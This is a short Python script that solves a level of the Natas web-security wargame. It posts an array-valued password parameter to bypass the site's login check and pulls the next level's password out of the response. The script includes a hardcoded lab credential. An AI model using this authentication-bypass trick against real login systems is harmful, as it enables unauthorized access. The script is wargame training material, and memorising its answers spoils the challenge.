import requests
import re

username ='natas24'
password ='OsRmXFguozKpTZZ5X14zNO43379LZveg'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()
responce = session.post(url,data={"passwd[]":"anything"},auth=(username,password))
content = responce.text
print(content)
print("the password for natas25 is = ",re.findall("Password: (.*)</pre>",content)[0])
 